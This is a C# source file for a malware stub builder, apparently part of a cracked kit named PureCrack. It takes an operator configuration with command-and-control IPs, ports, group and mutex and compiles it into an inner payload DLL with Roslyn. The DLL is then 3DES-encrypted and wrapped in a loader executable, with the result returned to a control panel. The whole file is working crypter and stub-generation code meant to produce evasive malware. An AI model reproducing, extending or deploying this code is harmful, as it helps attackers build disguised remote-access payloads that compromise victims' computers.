using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using PureCrack.Crypto;
using PureCrack.Util;

namespace PureCrack.Build;

/// <summary>
/// In-process stub builder. Replaces the Python kit's <c>csc.exe</c> shell-out
/// with Roslyn's <see cref="CSharpCompilation"/> API. End-to-end pipeline:
///
///   1. Encode <see cref="BuildConfig"/> as protobuf → gzip → base64
///   2. Substitute the base64 string into <c>Class9.cs</c>'s placeholder
///   3. Compile inner DLL via Roslyn (32 sources + protobuf-net.dll reference)
///   4. Gzip the inner DLL, prepend 4-byte LE original-size, PKCS7-pad
///   5. 3DES-CBC encrypt with random per-build 24-byte key + 8-byte IV
///   6. Substitute key/IV into <c>Loader.tmpl</c>
///   7. Compile outer EXE via Roslyn (Loader.cs + 2 embedded resources:
///      <c>PayloadSource.zip</c>=encrypted DLL, <c>protobuf-net.dll</c>)
///
/// Returns the outer EXE bytes. Caller writes to disk + serves to panel.
/// </summary>
public static class StubBuilder
{
    /// <summary>
    /// Build a stub from <paramref name="cfg"/>. Returns the outer EXE bytes.
    /// Throws on any compile or crypto failure; the relay reports the message
    /// back to the panel as a build error.
    /// </summary>
    public static byte[] Build(BuildConfig cfg)
    {
        Log.Section($"build stub: ips=[{string.Join(",", cfg.Ips)}] " +
                    $"ports=[{string.Join(",", cfg.Ports)}] " +
                    $"group={cfg.Group} mutex={cfg.Mutex}");
        var sw = Stopwatch.StartNew();

        // 1/5: encode + wrap + gzip + base64
        Log.Bullet("1/5 encode + wrap + gzip + base64 GClass3");
        var configB64 = InnerProto.EncodeAndPackage(cfg);
        Log.Bullet($"     config blob = {configB64.Length:N0} chars");

        // 2/5: stage 32 inner sources, substituting the placeholder in Class9
        Log.Bullet("2/5 stage 32 inner sources");
        var sources = StageInnerSources(configB64);

        // 3/5: compile inner DLL
        Log.Bullet("3/5 Roslyn → inner.dll");
        var innerDll = CompileInnerDll(sources);
        Log.Bullet($"     inner.dll = {innerDll.Length:N0}b");

        // 4/5: 3DES-encrypt the gzipped inner DLL
        Log.Bullet("4/5 gzip + 3DES wrap");
        var (encrypted, key, iv) = EncryptInner(innerDll);
        Log.Bullet($"     encrypted = {encrypted.Length:N0}b");

        // 5/5: build Loader.cs from template + compile outer EXE with resources
        Log.Bullet("5/5 Roslyn → outer.exe");
        var loaderSrc = EmbeddedAssets.LoaderTemplate
            .Replace("__KEY_B64__", Convert.ToBase64String(key))
            .Replace("__IV_B64__",  Convert.ToBase64String(iv));
        var outer = CompileOuterExe(loaderSrc, encrypted, EmbeddedAssets.ProtobufNetDll);

        Log.Ok($"build done in {sw.Elapsed.TotalSeconds:F1}s — outer.exe = {outer.Length:N0}b");
        RunPostBuildCleanup();
        return outer;
    }

    // ------------------------------------------------------------------------
    // Post-build memory cleanup
    // ------------------------------------------------------------------------
    //
    // WHY this exists (the "random crash after N builds" bug):
    //
    // Roslyn's CSharpCompilation allocates heavily on the Large Object Heap.
    // NET Framework 4.x NEVER compacts the LOH automatically — fragmentation
    // is permanent. After a few builds the LOH resembles Swiss cheese; the
    // next allocation fails with OutOfMemoryException even though total free
    // memory is ample. The crash looks random because it depends on how many
    // builds the operator has done, the sizes of the built stubs, and the
    // fragmentation pattern that happened to develop.
    //
    // The fix: force a full blocking GC with LOH compaction after every build.
    // CompactOnce tells the GC to compact the LOH during this GC cycle then
    // reset to default. The double-collect pattern ensures objects that became
    // unreachable only after finalizers ran (e.g., Roslyn's internal native
    // resource wrappers) are also cleaned up.

    private static void RunPostBuildCleanup()
    {
        try
        {
            GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }
        catch
        {
            // Best-effort — if GC settings are somehow unavailable, the build
            // still succeeded and the operator gets their stub. The crash will
            // just come after more builds instead of being prevented.
        }
    }

    // ------------------------------------------------------------------------
    // Stage inner sources (substitute placeholder in Class9.cs)
    // ------------------------------------------------------------------------

    private static IReadOnlyDictionary<string, string> StageInnerSources(string configB64)
    {
        var staged = EmbeddedAssets.InnerSources.ToDictionary(
            kv => kv.Key, kv => kv.Value, StringComparer.OrdinalIgnoreCase);
        if (!staged.TryGetValue("Class9.cs", out var class9))
            throw new InvalidOperationException(
                "Class9.cs missing from embedded inner sources — corrupted EXE?");
        if (!class9.Contains(InnerProto.Placeholder))
            throw new InvalidOperationException(
                $"placeholder '{InnerProto.Placeholder}' not found in Class9.cs " +
                "— inner sources don't match expected v4.0.9596 layout");
        staged["Class9.cs"] = class9.Replace(InnerProto.Placeholder, configB64);
        return staged;
    }

    // ------------------------------------------------------------------------
    // 3DES encryption of the inner DLL
    // ------------------------------------------------------------------------

    private static (byte[] encrypted, byte[] key, byte[] iv) EncryptInner(byte[] innerDll)
    {
        var gz = Symmetric.Gzip(innerDll);

        // Loader expects: [4-byte LE original-DLL-size][gzipped DLL]
        // The size lets the loader allocate the right-sized buffer for inflate.
        var plaintext = new byte[4 + gz.Length];
        plaintext[0] = (byte)(innerDll.Length        & 0xFF);
        plaintext[1] = (byte)((innerDll.Length >>  8) & 0xFF);
        plaintext[2] = (byte)((innerDll.Length >> 16) & 0xFF);
        plaintext[3] = (byte)((innerDll.Length >> 24) & 0xFF);
        Buffer.BlockCopy(gz, 0, plaintext, 4, gz.Length);

        var key = Symmetric.RandomBytes(24);
        var iv  = Symmetric.RandomBytes(8);
        var encrypted = Symmetric.TripleDesEncrypt(plaintext, key, iv);
        return (encrypted, key, iv);
    }

    // ------------------------------------------------------------------------
    // Roslyn compile — inner DLL
    // ------------------------------------------------------------------------

    private static byte[] CompileInnerDll(IReadOnlyDictionary<string, string> sources)
    {
        var trees = sources
            .OrderBy(kv => kv.Key)
            .Select(kv => CSharpSyntaxTree.ParseText(kv.Value, path: kv.Key))
            .ToList();

        var refs = GetBclReferences().ToList();
        // Inner DLL uses protobuf-net types (ProtoMember, ProtoContract, etc.).
        refs.Add(MetadataReference.CreateFromImage(EmbeddedAssets.ProtobufNetDll));

        var opts = new CSharpCompilationOptions(
            OutputKind.DynamicallyLinkedLibrary,
            platform: Platform.X86,
            optimizationLevel: OptimizationLevel.Release,
            allowUnsafe: true,
            deterministic: true,
            warningLevel: 0);

        var comp = CSharpCompilation.Create("inner", trees, refs, opts);
        return EmitOrThrow(comp, "inner.dll", resources: null);
    }

    // ------------------------------------------------------------------------
    // Roslyn compile — outer EXE
    // ------------------------------------------------------------------------

    private static byte[] CompileOuterExe(string loaderSource, byte[] encryptedInner,
                                           byte[] protobufNetDll)
    {
        var tree = CSharpSyntaxTree.ParseText(loaderSource, path: "Loader.cs");

        // Outer Loader uses only BCL types (System.IO, Reflection, Crypto).
        var refs = GetBclReferences().ToList();

        var opts = new CSharpCompilationOptions(
            OutputKind.WindowsApplication,
            platform: Platform.X86,
            optimizationLevel: OptimizationLevel.Release,
            mainTypeName: "PCLoader",
            deterministic: true,
            warningLevel: 0);

        var comp = CSharpCompilation.Create("Loader", new[] { tree }, refs, opts);

        // Two embedded resources: encrypted inner DLL + protobuf-net.dll.
        // Loader's AssemblyResolve hook serves protobuf-net.dll when the
        // inner DLL's deserialiser asks for it.
        var resources = new[]
        {
            new ResourceDescription(
                resourceName: "PayloadSource.zip",
                dataProvider: () => new MemoryStream(encryptedInner),
                isPublic: false),
            new ResourceDescription(
                resourceName: "protobuf-net.dll",
                dataProvider: () => new MemoryStream(protobufNetDll),
                isPublic: false),
        };
        return EmitOrThrow(comp, "Loader.exe", resources);
    }

    // ------------------------------------------------------------------------
    // Roslyn shared helpers
    // ------------------------------------------------------------------------

    private static byte[] EmitOrThrow(CSharpCompilation comp, string label,
                                      IEnumerable<ResourceDescription>? resources)
    {
        using var ms = new MemoryStream();
        var result = comp.Emit(ms, manifestResources: resources);
        if (!result.Success)
        {
            var errs = result.Diagnostics
                .Where(d => d.Severity == DiagnosticSeverity.Error)
                .Take(20)
                .Select(d => d.ToString())
                .ToList();
            throw new InvalidOperationException(
                $"Roslyn failed compiling {label}:\n  " + string.Join("\n  ", errs));
        }
        ms.Position = 0;
        return ms.ToArray();
    }

    /// <summary>
    /// Resolve the .NET Framework reference assemblies used to compile the
    /// inner DLL and outer Loader. Since PureCrack.exe itself targets net472,
    /// <see cref="object"/>'s assembly location points at the net472 mscorlib;
    /// every framework DLL we need lives in the same directory.
    /// </summary>
    private static IEnumerable<MetadataReference> GetBclReferences()
    {
        var bclPath = System.IO.Path.GetDirectoryName(typeof(object).Assembly.Location)
                     ?? throw new InvalidOperationException(
                         "can't resolve mscorlib directory");

        // Mirror of the Python kit's INNER_REFS list. Matches the original
        // PureCrack stub exactly. If the panel's inner sources ever pick up
        // a new BCL ref, add it here.
        var required = new[]
        {
            "mscorlib.dll",
            "System.dll",
            "System.Core.dll",
            "System.Xml.dll",
            "System.Data.dll",
            "System.Management.dll",
            "System.Windows.Forms.dll",
            "System.Drawing.dll",
            "System.Runtime.Serialization.dll",
        };
        foreach (var name in required)
        {
            var p = System.IO.Path.Combine(bclPath, name);
            if (File.Exists(p))
                yield return MetadataReference.CreateFromFile(p);
        }
    }
}
